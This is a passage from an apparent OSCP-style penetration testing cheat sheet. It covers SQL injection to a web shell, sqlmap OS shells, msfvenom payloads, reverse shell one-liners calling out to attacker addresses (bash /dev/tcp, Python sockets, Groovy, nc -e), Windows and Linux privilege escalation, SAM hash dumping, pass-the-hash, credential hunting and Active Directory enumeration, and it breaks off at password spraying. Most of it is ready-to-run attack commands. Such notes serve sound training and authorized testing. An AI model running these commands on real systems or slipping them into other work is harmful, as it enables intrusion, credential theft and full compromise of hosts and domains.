EXECUTE xp_cmdshell 'whoami';

#Sometimes we may not have direct access to convert it to RCE from web, then follow below steps
' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- // #Writing into a new file
#Now we can exploit it
http://192.168.45.125/tmp/webshell.php?cmd=id #Command execution
```

- SQLMap - Automated Code execution

> **Training only: SQLMap is prohibited in the OSCP exam.** These historical examples are for authorized practice where the tool is allowed. Use the [manual web workflow](../web.md) to practice without it. See the [official restrictions](https://help.offsec.com/hc/en-us/articles/360040165632-OSCP-Exam-Guide).

```text
sqlmap -u http://192.168.50.19/blindsqli.php?user=1 -p user #Testing on parameter names "user", we'll get confirmation
sqlmap -u http://192.168.50.19/blindsqli.php?user=1 -p user --dump #Dumping database

#OS Shell
#  Obtain the Post request from Burp suite and save it to post.txt
sqlmap -r post.txt -p item  --os-shell  --web-root "/var/www/html/tmp" #/var/www/html/tmp is the writable folder on target, hence we're writing there

```

---

## Exploitation

### Finding Exploits

#### Searchsploit

```text
searchsploit <name>
searchsploit -m windows/remote/46697.py #Copies the exploit to the current location
```

### Reverse Shells

#### Msfvenom

Run these generators in Kali Bash. Match OS, architecture, staged versus single payload and handler. A staged `windows/shell/reverse_tcp` needs a compatible staging handler; a plain Netcat listener does not supply the stage. The underscore form `shell_reverse_tcp` is a single payload. See [payload types](https://docs.rapid7.com/metasploit/working-with-payloads/) and the [exam limitations](../exam.md).

```text
msfvenom -p windows/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x86.exe
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x64.exe

msfvenom -p windows/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f asp > shell.asp
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > shell.jsp
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f war > shell.war
msfvenom -p php/reverse_php LHOST=<IP> LPORT=<PORT> -f raw > shell.php
```

#### One Liners

Match the interpreter, runtime and callback route before use. PHP shell commands are parsed by an intermediate OS shell; Bash-specific redirections must be interpreted by Bash. [Shell selection](https://www.php.net/manual/en/function.shell-exec.php).

```text
bash -i >& /dev/tcp/10.0.0.1/4242 0>&1
python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
# The former PHP one-liner depended on the intermediate shell; see the retired snippet notes below.
#PowerShell -EncodedCommand expects Base64-encoded UTF-16LE text; Base64 is encoding, not encryption.
```

**Exam Tip:** While dealing with PHP reverseshell use: [https://github.com/ivan-sincek/php-reverse-shell/blob/master/src/reverse/php_reverse_shell.php](https://github.com/ivan-sincek/php-reverse-shell/blob/master/src/reverse/php_reverse_shell.php)

#### Groovy reverse-shell

- Historical Jenkins example: requires a permitted script-console execution context. Replace the destination with an address reachable from the Jenkins host; `localhost` below is the target itself. `cmd.exe` assumes Windows. Validate OS and route before selecting a shell.

```text
String host="localhost";
int port=8044;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

---

## Windows Privilege Escalation

**Checklist**

- [ ] Identity, enabled privileges and local/domain groups recorded?
- [ ] Service/task identity, writable component and trigger all verified?
- [ ] Saved credentials, relevant history and application configurations checked?
- [ ] Resulting privileged shell and required evidence captured?

Use the [exam evidence checklist](../exam.md#evidence-at-each-milestone) for proof requirements; a recursive text search is not proof of privileged access.

### Manual Enumeration commands

Target PowerShell:

```text
#Groups we're part of
whoami /groups

whoami /all # current token identity, groups and privileges

#Starting, Restarting and Stopping services in Powershell
Start-Service <service>
Stop-Service <service>
Restart-Service <service>

#Powershell History
Get-History
(Get-PSReadlineOption).HistorySavePath #displays the path of consoleHost_history.txt
type C:\Users\sathvik\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt

#Viewing installed execuatbles
Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname

#Process Information
Get-Process
Get-Process | Select ProcessName,Path

#Sensitive info in XAMPP Directory
Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\Users\dave\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue #this for a specific user

#Service Information
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
```

### Automated Scripts

Use these to fill gaps after manual triage. Check upstream invocation and the local filename; PowerShell scripts must be loaded or invoked according to their documentation. A filename list is an inventory, not one executable script.

```text
winpeas.exe
winpeas.bat
Jaws-enum.ps1
powerup.ps1
PrivescCheck.ps1
```

### Token Impersonation

Check OS build, architecture, enabled privileges and the required service/trigger. A privilege name alone does not establish exploitability. [PrintSpoofer](https://github.com/itm4n/PrintSpoofer) is archived; use each project's documented target support. [JuicyPotatoNG](https://github.com/antonioCoco/JuicyPotatoNG).
- Command to check `whoami /priv`

```text
#Printspoofer
PrintSpoofer.exe -i -c powershell.exe
PrintSpoofer.exe -c "nc.exe <lhost> <lport> -e cmd"

#RoguePotato
RoguePotato.exe -r <AttackerIP> -e "shell.exe" -l 9999

#GodPotato
GodPotato.exe -cmd "cmd /c whoami"
GodPotato.exe -cmd "shell.exe"

#JuicyPotatoNG
JuicyPotatoNG.exe -t * -p "C:\Windows\System32\cmd.exe" -a "/c whoami"

#SharpEfsPotato
SharpEfsPotato.exe -p C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe -a "whoami | Set-Content C:\temp\w.log"
#writes whoami command to w.log file
```

### Services

#### Binary Hijacking

```text
#Identify service from winpeas
icacls "path" # inspect effective file/directory rights; F means full control, but narrower write/modify rights may suffice
sc.exe qc <servicename> #find binarypath variable
sc.exe config <service> binPath= "<FULL_BINARY_PATH>" # requires SERVICE_CHANGE_CONFIG; space after = is required
sc.exe start <servicename>
```

#### Unquoted Service Path

```text
Get-CimInstance Win32_Service | Select-Object Name,StartName,PathName
# PowerShell: inspect unquoted executable paths containing spaces, then verify write access and a trigger.
#Check the Writable path
icacls "path"
#Insert the payload in writable location and which works.
sc.exe start <servicename>
```

#### Insecure Service Executables

```text
#In Winpeas look for a service which has the following
File Permissions: Everyone [AllAccess]
#Replace the executable in the service folder and start the service
sc.exe start <service>
```

#### Weak Registry permissions

```text
#Look for the following in Winpeas services info output
HKLM\system\currentcontrolset\services\<service> (Interactive [FullControl]) #This means we have ful access

accesschk.exe -accepteula -uvwqk <path of registry> #Check for KEY_ALL_ACCESS

#Service Information from regedit, identify the variable which holds the executable
reg query <reg-path>

reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\PrivEsc\reverse.exe /f
#Imagepath is the variable here

net start <service>
```

### DLL Hijacking

1. Find Missing DLLs using Process Monitor, Identify a specific service which looks suspicious and add a filter.
2. Check whether you have write permissions in the directory associated with the service.
```text
# Create a reverse-shell
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attaker-IP> LPORT=<listening-port> -f dll > filename.dll
```
3. The filename must exactly match the requested DLL, in a directory actually searched by the loader; a similar name is insufficient.
4. First demonstrate that this exact name/path is loaded by the intended higher-privilege process, with compatible architecture/exports and an available trigger. A missing-DLL event alone does not prove this. Use [Windows service interpretation](../windows-services.md) before changing the service.

#### DLL Hijacking adding New user into Administrators group

The former `system()`/account-creation example is retained in [retired snippets](retired-snippets.md#dll-account-creation-example). It is not the default demonstration: it performs complex work in `DllMain`, assumes a privileged loader and a particular group name, and ignores command results. See [Microsoft DLL guidance](https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-best-practices). Validate the load and identity with a minimal lab observation before any approved state change.

### Autorun

These entries launch at logon in the relevant user context. A member of Administrators can still run with a filtered token. Consult [Run keys](https://learn.microsoft.com/en-us/windows/win32/setupapi/run-and-runonce-registry-keys), [UAC](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/user-account-control/how-it-works) and the [current interpretation guide](../windows-services.md).

```text
#For checking, it will display some information with file-location
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run

#Check the location is writable
accesschk.exe -accepteula -wvu "<path>" #returns FILE_ALL_ACCESS

# HKCU applies to that user; another admin logging in does not run your HKCU entry.
# Establish the actual logon user and integrity level. Run entries do not guarantee elevation under UAC.
# Inspect the startup command, effective write rights and an observed/available trigger before considering a change.
```

### AlwaysInstallElevated

```text
#For checking, it should return 1 or Ox1
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

#Creating a reverseshell in msi format
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<port> --platform windows -f msi > reverse.msi

#Execute and get shell
msiexec /quiet /qn /i reverse.msi
```

### Scheduled Tasks

```text
schtasks /query /fo LIST /v #Displays list of scheduled tasks, Pickup any interesting one
#Check write access to the executed component, task identity and trigger; writable alone is insufficient.
icacls "path"
# Observe the task trigger and resulting identity; a writable action does not guarantee privileged execution.
```

### Startup Apps

```text
C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp #Startup applications can be found here
#Check writable permissions and transfer
#Startup-folder programs normally run at user sign-in, with that user's context; restart alone does not imply elevation.
```

### Insecure GUI apps

```text
#Check the applications that are running from "TaskManager" and obtain list of applications that are running as Privileged user
#Open that particular application, using "open" feature enter the following
file://c:/windows/system32/cmd.exe
```

### SAM and SYSTEM

- Check in following folders

```text
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system

C:\windows.old

#First go to c:
dir /s SAM
dir /s SYSTEM
```

- Obtaining Hashes from SYSTEM and SAM

```text
impacket-secretsdump -system SYSTEM -sam SAM local
#always mention local in the command
#Now a detailed list of hashes are displayed
```

### Passwords

#### Sensitive files

Target CMD; start from a relevant application or user directory:

```cmd
findstr /si password *.txt
findstr /si password *.xml
findstr /si password *.ini
Findstr /si password *.config
findstr /si /c:"pass" /c:"pwd" *.ini

dir /s /b *pass* *cred* *vnc* *.config*

# Search text files recursively
findstr /spin "password" *.*
```

#### Config files

```text
c:\sysprep.inf
c:\sysprep\sysprep.xml
c:\unattend.xml
%WINDIR%\Panther\Unattend\Unattended.xml
%WINDIR%\Panther\Unattended.xml

dir /b /s unattend.xml
dir /b /s web.config
dir /b /s sysprep.inf
dir /b /s sysprep.xml
dir /b /s *pass*

dir c:\*vnc.ini /s /b
dir c:\*ultravnc.ini /s /b
dir c:\ /s /b | findstr /si *vnc.ini
```

#### Registry

Target CMD (the commented labels below group queries):

```text
reg query HKLM /f password /t REG_SZ /s
reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon"

#Putty keys
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there

### VNC
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKCU\Software\TightVNC\Server"

### Windows autologin
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr "DefaultUserName DefaultDomainName DefaultPassword"

### SNMP Parameters
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP"

### Putty
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"

### Search for password in registry
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
```

#### RunAs - Savedcreds

```text
cmdkey /list #Displays stored credentials, looks for any optential users
#Transfer the reverseshell
runas /savecred /user:admin C:\Temp\reverse.exe
```

#### Pass the Hash

```text
#If hashes are obtained though some means then use psexec, smbexec and obtain the shell as different user.
pth-winexe -U JEEVES/administrator%aad3b43XXXXXXXX35b51404ee:e0fb1fb857XXXXXXXX238cbe81fe00 //10.129.26.210 cmd.exe
```

---

## Linux Privilege Escalation

**Checklist**

- [ ] Identity, groups and exact sudo rules checked?
- [ ] SUID owner, capabilities and mount restrictions verified?
- [ ] Writable scheduled components, service configs and local listeners checked?
- [ ] Reused passwords and relevant history/configuration secrets tested?
- [ ] Root shell and required evidence captured?

- [Privesc through TAR wildcard](https://medium.com/@polygonben/linux-privilege-escalation-wildcards-with-tar-f79ab9e407fa)

### TTY Shell

```text
python3 -c 'import pty; pty.spawn("/bin/bash")'
/bin/sh -i
/bin/bash -i
perl -e 'exec "/bin/sh";'
```

### Basic

```text
find / -writable -type d 2>/dev/null
dpkg -l #Installed applications on debian system
cat /etc/fstab #Listing mounted drives
lsblk #Listing all available drives
lsmod #Listing loaded drivers

watch -n 1 "ps aux | grep pass" #Checking processes for credentials
sudo tcpdump -i lo -A | grep "pass" #Password sniffing using tcpdump

```
### Manual Enumeration

- id
- `cat /etc/passwd` - displays all the user
    - `cat /etc/passwd | cut -d ":" -f 1` - removes other stuff & only displays users
    - `ls /home` - displays users
- `hostname` - lists the name of the host
- `cat /etc/issue` - login banner; verify distribution details with `/etc/os-release`
- `cat /etc/os-release` - distribution identification
- `uname -a` - prints kernel information
```text
cd /home
groups <USER>
id -G <USER>
```

- `ps` - lists the processes that are running
    - `ps -A` - all running processes
    - `ps axjf` - process tree
    - `ps aux` - displays processes with the users as well
Additional Linux checks (run alternatives individually; some require privileges or installed legacy utilities):

```text
ip addr                        # legacy alternative: ifconfig
ip route                       # alternatives: routel, route
ss -anp                        # legacy alternative: netstat -anp
cat /etc/iptables/rules.v4
ls -lah /etc/cron*
crontab -l
sudo crontab -l
dpkg -l                        # RPM systems: rpm -qa
find / -writable -type d 2>/dev/null
cat /etc/fstab
mount
lsblk
lsmod
/sbin/modinfo libata            # inspect a module actually observed in lsmod
find / -perm -u=s -type f 2>/dev/null
strings <FILE_TO_INSPECT>
which bash sh awk perl python ruby gcc cc vi vim nmap find netcat nc wget tftp ftp git 2>/dev/null
```

- `cat /proc/version` - prints almost same infor of above command but more like gcc version....

- `env` - shows all the environment variable
- `sudo -l` - lists the current user's allowed commands, run-as identities and tags; NOPASSWD is a separate condition
- `groups` - lists the groups that current user is in
- `id` - lists id of group,user

- `history` - previously ran commands which might have some sensitive info
- `ifconfig` (or) `ip a` (or) `ip route` - network related information

- **netstat** - network connection/interface statistics; use `netstat -r` for routes
    - `netstat -a` - all listening and established connection
    - `netstat -at` - tcp connections
    - `netstat -au` - udp connections
    - `netstat -l` - listening connections
    - `netstat -s` - network statistics
    - `netstat -tp` - connections with service name and pid we can also add "l" for only listening ports
    - `netstat -i` - interface related information
    - `netstat -ano`

- **find** command which helps us in finding lot of stuff,
    - Syntax: `find <path> <options> <regex/name>` find . -name flag1.txt: find the file named “flag1.txt” in the current directory
    - `find /home -name flag1.txt` : find the file names “flag1.txt” in the /home directory
    - `find / -type d -name config` : find the directory named config under “/”
    - `find / -type f -perm 0777` : find files with the 777 permissions (files readable, writable, and executable by all users)
    - `find / -type f -executable 2>/dev/null` : find files executable by the current user
    - `find /home -user frank` : find all files for user “frank” under “/home”
    - `find / -mtime -10` : find files that were modified in the last 10 days
    - `find / -atime -10` : find files that were accessed in the last 10 days
    - `find / -cmin -60` : find files changed within the last hour (60 minutes)
    - `find / -amin -60` : find files accesses within the last hour (60 minutes)
    - `find / -size 50M` : find files with a 50 MB size
    - `find / -writable -type d 2>/dev/null` : find directories writable by the current user
    - `find / -perm -0002 -type d 2>/dev/null` : find world-writable directories
    - `find / -perm -0001 -type d 2>/dev/null` : find world-executable directories
    - We can also find programming languages and supported languages: `find / -name 'perl*'`, `find / -name 'python*'`, `find / -name 'gcc*'` ...etc
    - `find / -perm -u=s -type f 2>/dev/null` : Find SUID files; owner, mount policy and program behavior determine the effective context. The owner need not be root.

### Automated Scripts

Use an enumeration script after manual triage leaves a specific gap; confirm the relevant permissions and configuration yourself. An exploit suggester reports candidates, not demonstrated vulnerabilities.

- LinPeas: [https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS](https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS)
- LinEnum: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)
- LES (Linux Exploit Suggester): [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)
- Linux Smart Enumeration: [https://github.com/diego-treitos/linux-smart-enumeration](https://github.com/diego-treitos/linux-smart-enumeration)
- Linux Priv Checker: [https://github.com/linted/linuxprivchecker](https://github.com/linted/linuxprivchecker)

### Sensitive Information

```text
cat .bashrc
env #checking environment variables
watch -n 1 "ps aux | grep pass" #Harvesting active processes for credentials
#Process related information can also be obtained from PSPY
```

### Sudo/SUID/Capabilities

#### Sudo:

[](https://github.com/saisathvik1/Linux-Privilege-Escalation-Notes#sudo)

- Run `sudo -l` early. Read the run-as identity, exact arguments and tags; only `NOPASSWD` entries waive the authentication requirement. A rule may permit a user other than root.
- Read the exact run-as identity, argument constraints and authentication tag. Use [the interpreted Linux examples](../linux-permissions.md) and a matching [GTFOBins entry](https://gtfobins.github.io/); permission to run a file is not permission to modify it.
- Select the entry for the observed permission mechanism and binary build; confirm the actual result with `id`.

---

#### SUID:(Set owner User ID)

[](https://github.com/saisathvik1/Linux-Privilege-Escalation-Notes#suidset-owner-user-id)

- Its a kind of permission which gives specific permissions to run a file as root/owner
- Check the owner, mount flags and program behavior before testing a matching SUID entry.
- `find / -perm -u=s -type f 2>/dev/null` this will list all the suid files
- Then later search in GTFObins and look for the way to bypass
- Resource: [https://null-byte.wonderhowto.com/how-to/crack-shadow-hashes-after-getting-root-linux-system-0186386/](https://null-byte.wonderhowto.com/how-to/crack-shadow-hashes-after-getting-root-linux-system-0186386/)

---

#### Capabilities:

[](https://github.com/saisathvik1/Linux-Privilege-Escalation-Notes#capabilities)

- Capabilities are a bit similar to the SUID
- Capabilities provide a subset of root privileges to a process or a binary
- In order to look for them use `getcap -r / 2>/dev/null`
- Match the binary, capability and runtime features to the relevant **GTFOBins** entry. A listed capability does not guarantee an escalation path.
- In the example they provided a capability for `vim` and I used `./vim -c ':py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'` which is provided in the website itself and I got root!
- If a test fails, record which prerequisite is absent before changing approach.

### Cron Jobs

- Crons jobs are used for scheduling! Here we can schedule any binary/process to run.
- Interesting part here is that by default they run with the owner privileges.
- But if we find any cron-job which we can edit then we can do a lot!
- Cron configuration is stored in system and user **crontabs**; the execution user and permissions depend on that configuration.
- To view crontab, `cat /etc/crontab`
- Read access depends on permissions; user crontabs and logs may be restricted.
- For any candidate, establish the scheduled execution user, exact command/component, effective write access and an observed trigger. A writable user-level cron job does not establish root access.

```text
#Detecting Cronjobs
cat /etc/crontab
crontab -l

pspy #handy tool to livemonitor stuff happening in Linux

grep "CRON" /var/log/syslog #inspecting cron logs
```
### NC Netcat

`-e` is implementation-specific and absent from OpenBSD netcat. Check `nc -h` before using historical examples; a listener alone does not execute a shell.

```text
nc -nlvp <port>
nc <attacker-ip> <port> -e /bin/bash
```
### NFS

- Read `/etc/exports` and included `/etc/exports.d/*.exports` on the server if permitted. `showmount -e <target IP>` lists exports where the mount service is available; it does not reveal all export options and can miss NFSv4-only configurations.
- Verify `no_root_squash` in the server configuration or effective behavior. The export must also be writable, and the target execution mount must honor SUID (not `nosuid`). Client root privileges alone do not bypass root squashing.
- Now after getting some directories where we can play around lets navigate to our attacker machine and create a sample directory anywhere like `/tmp`...etc
- Now we need to mount to the target machine by, `mount -o rw <targetIP>:<share-location> <directory path we created>`, `rw` requests a writable client mount; the server still enforces export and filesystem permissions.
- Now go to the folder we created and create a binary which gives us root on running.
- Then go back to the target machine and run the binary from the exported directory. Making it executable is not sufficient: the binary must be owned by root and have its owner SUID bit set, for example with `chmod u+s <binary>` from the client root context.
- Confirm the resulting identity; abandon this path if server ownership or target execution flags invalidate the prerequisite.

```text
##Mountable shares
cat /etc/exports #On target
showmount -e <target IP> #On attacker
###Verify export options on the server; showmount does not establish no_root_squash.

mount -o rw <targetIP>:<share-location> <directory path we created>
#Now create a binary there
chmod +x <binary> # execute bit alone is not the root ownership/SUID prerequisite described above
```

### PATH

[](https://github.com/saisathvik1/Linux-Privilege-Escalation-Notes#path)

- PATH is an environment variable
- In order to run any binary we need to specify the full path also, but if the address of file is specified in PATH variable then we can simpley run the binary by mentioning its name, like how we run some command line tools like ls, cd,....etc
- In order to view the content in PATH variable we need to run `echo $PATH` and the outpur will be something like this `usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin`
- So whenever you use a tool without specifying path it searches in PATH and it runs!
- We can even add new path to PATH variable by `export PATH=<new-path>:$PATH`
- Also we need to find a writable paths so run `find / -writable 2>/dev/null`
- In the example I found a location where there's a script when I run its showing that "thm" not found, also it can be run as ROOT
- Historical observation: an unqualified command named `thm` was resolved through PATH. To reuse that finding, establish the privileged program, its effective PATH, a searched writable directory and preserved execution privilege. Changing your interactive PATH alone does not change a service or a sanitized sudo environment. See [Linux permission decisions](../linux-permissions.md).

---

### Writable /etc/passwd file

Historical lab transcript (`>` marks the prompt). The file must be writable, and the target authentication stack must accept the generated hash format. A duplicate UID 0 entry changes account state; record and restore the original file in your disposable lab.

```text
>ls -l /etc/passwd
-rw-rw-rw- 1 root root 1370 Apr 12 16:44 /etc/passwd (#Write permission)
>openssl passwd -6
# Enter a lab password interactively; use the generated hash below.
>echo 'ashok:<GENERATED_HASH>:0:0:root:/root:/bin/bash' >> /etc/passwd
>su ashok
# Historical lab transcript: replace <GENERATED_HASH>; verify id after authentication.
```
### Exploiting Kernel Vulnerabilities

Match the exact kernel package, architecture and configuration to the distribution advisory, including backported fixes. A banner match does not prove exploitability. Record these before selecting an external PoC:

```text
uname -r
uname -m
cat /etc/os-release
```

### CVE - Linux

See [CVE references](../cve-references.md) for scoped Sudo, polkit and kernel advisories with external GitHub PoCs. Match each repository's supported target rather than assuming one script works on every affected version.

---

## Post Exploitation

> This is more windows specific as exam specific.
>

> **Exam Tip:** After a privilege change, repeat targeted checks for previously unreadable configurations and history. Use winPEAS to fill an identified enumeration gap and verify its findings manually.

### Sensitive Information

#### Powershell History

Target PowerShell (`$env:APPDATA` expands here; `%APPDATA%` is CMD syntax). PSReadLine may be absent in noninteractive sessions:

```text
Get-Content "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"

#Example
type C:\Users\sathvik\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```

#### Searching for passwords

```text
Get-ChildItem -Path . -Recurse -File -Include *pass*,*.config -ErrorAction SilentlyContinue
Get-ChildItem -Path . -Recurse -File -Include *.xml,*.ini,*.txt -ErrorAction SilentlyContinue | Select-String -Pattern password
```

#### Searching in Registry for Passwords

```text
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
```

> **Exam Tip:** Check relevant Documents folders for configurations, backups and credential stores; record the source and identity of each useful secret.

#### KDBX Files

```text
#These are KeyPassX password stored files
# PowerShell
Get-ChildItem -Recurse -File -Filter *.kdbx -ErrorAction SilentlyContinue

#Cracking
keepass2john Database.kdbx > keepasshash
john --wordlist=/home/sathvik/Wordlists/rockyou.txt keepasshash
```

### Dumping Hashes

Identify the credential source and effective read privileges first. Mimikatz access depends on protection and token context; BloodHound maps directory relationships and does not dump password hashes. See [AD credential handling](../active-directory.md#4-track-credentials-and-authentication-types).

---

## Active Directory Pentesting

**Checklist**

- [ ] Domain/DC DNS and clock alignment verified?
- [ ] Credential origin, type and local/domain scope recorded?
- [ ] Group/ACL paths verified against current directory data?
- [ ] New host access followed by local re-enumeration?
- [ ] Lockout policy considered before repeated login tests?

> **Exam Tip:** Establish the domain, current identity, DNS and routes before collecting directory data.

### Enumeration

```text
net localgroup Administrators #to check local admins
```

#### Powerview

Historical function names vary by PowerView generation. The [current AD workflow](../active-directory.md) demonstrates identity and ACL interpretation; use one pinned implementation and its help.

```text
Import-Module .\PowerView.ps1 #loading module to powershell, if it gives error then change execution policy
Get-NetDomain #basic information about the domain
Get-NetUser #list of all users in the domain
# The output can be filtered with Select-Object. For example, `Get-NetUser | Select-Object cn`; multiple properties can be separated by commas.
Get-NetGroup # enumerate domain groups
Get-NetGroup "group name" # information from specific group
Get-NetComputer # enumerate the computer objects in the domain
Find-LocalAdminAccess # scans the network in an attempt to determine if our current user has administrative permissions on any computers in the domain
Get-NetSession -ComputerName files04 -Verbose #Checking logged on users with Get-NetSession, adding verbosity gives more info.
Get-NetUser -SPN | select samaccountname,serviceprincipalname # Listing SPN accounts in domain
Get-ObjectAcl -Identity <user> # enumerates ACE(access control entities), lists SID(security identifier). ObjectSID
Convert-SidToName <sid/objsid> # converting SID/ObjSID to name

# Checking for "GenericAll" right for a specific group, after obtaining they can be converted using convert-sidtoname
Get-ObjectAcl -Identity "group-name" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights

Find-DomainShare #find the shares in the domain

Get-DomainUser -PreauthNotRequired -verbose # identifying AS-REP roastable accounts

Get-NetUser -SPN | select serviceprincipalname #Kerberoastable accounts
```
#### Domain

PowerShell (CIM works without the deprecated WMIC executable):

```text
Get-CimInstance Win32_ComputerSystem | Select-Object Name,Domain,PartOfDomain
Get-DnsClientServerAddress -AddressFamily IPv4
```

Use the AD DNS domain and DC FQDN for Kerberos. A successful ping does not establish LDAP or Kerberos reachability.

#### Bloodhound

Use BloodHound Community Edition and a compatible collector. The legacy Neo4j desktop setup is not the CE deployment process. Follow the [official deployment and collector guidance](https://bloodhound.specterops.io/collect-data/ce-collection/overview).

Kali, with the CE variant of BloodHound.py installed:

```text
bloodhound-ce-python -u '<USER>' -p '<PASSWORD>' -ns <DC_IP> -d <DOMAIN> -c All --zip
```

Windows, with a CE-compatible SharpHound release:

```text
.\SharpHound.exe --CollectionMethods All --OutputDirectory C:\Temp\bloodhound
```

Import the output into CE and check collection errors before interpreting paths. See [AD workflow](../active-directory.md) for permissions, DNS and credential scope. Legacy `bloodhound-python` output must match a legacy deployment.

#### LDAPDOMAINDUMP

- These files contains information in a well structured webpage format.

```text
sudo ldapdomaindump ldaps://<IP> -u 'username' -p 'password' #Do this in a new folder
```

#### PlumHound

These are legacy Neo4j workflows. Check the project's supported BloodHound generation before using them with CE.

- Link: https://github.com/PlumHound/PlumHound install from the steps mentioned.
- Keep both Bloodhound and Neo4j running as this tool acquires information from them.

```text
python3 PlumHound.py --easy -p <neo4j-password> #Testing connection
python3 PlumHound.py -x tasks/default.tasks -p <neo4jpass> #Open index.html as once this command is completed it produces somany files
firefox index.html
```

#### PingCastle

- [www.pingcastle.com](http://www.pingcastle.com) - Download Zip file from here.
- This needs to be run on windows machine, just hit enter and give the domain to scan.
- It gives a report at end of scan.

#### PsLoggedon

```text
# To see user logons at remote system of a domain(external tool)
.\PsLoggedon.exe \\<computername>
```

#### GPP or CPassword

- Impacket

```text
# with a NULL session
impacket-Get-GPPPassword -no-pass 'DOMAIN_CONTROLLER'

# with cleartext credentials
impacket-Get-GPPPassword 'DOMAIN'/'USER':'PASSWORD'@'DOMAIN_CONTROLLER'

# pass-the-hash (with an NT hash)
impacket-Get-GPPPassword -hashes :'NThash' 'DOMAIN'/'USER'@'DOMAIN_CONTROLLER'

# parse a local file
impacket-Get-GPPPassword -xmlfile '/path/to/Policy.xml' 'LOCAL'
```

- SMB share - If SYSVOL share or any share which `domain` name as folder name

```text
#Download the whole share
https://github.com/ahmetgurel/Pentest-Hints/blob/master/AD%20Hunting%20Passwords%20In%20SYSVOL.md
#Navigate to the downloaded folder
grep -inr "cpassword"
```

- NetExec

```text
nxc smb <TARGET[s]> -u <USERNAME> -p <PASSWORD> -d <DOMAIN> -M gpp_password
nxc smb <TARGET[s]> -u <USERNAME> -H <LMHASH>:<NTHASH> -d <DOMAIN> -M gpp_password
```

- Decrypting the CPassword

```text
gpp-decrypt "cpassword"
```

### **Attacking Active Directory**

> **Exam Tip:** Track each credential’s source, account scope and verified access; revisit relevant services when a new secret is found.

#### Zerologon

Historical, patched CVE-2020-1472; not a generic credential-free hash dump. It requires a vulnerable DC and reachable Netlogon RPC. Exploit variants can change the DC machine-account password and disrupt the domain. Consult the [external reference](../cve-references.md) before considering it in a disposable lab.

#### Password Spraying

```text
# NetExec - administrative access is indicated by "Pwn3d!"
nxc smb <IP or subnet> -u users.txt -p 'pass' -d <domain> --continue-on-success #continue testing after a successful authentication

# Kerbrute
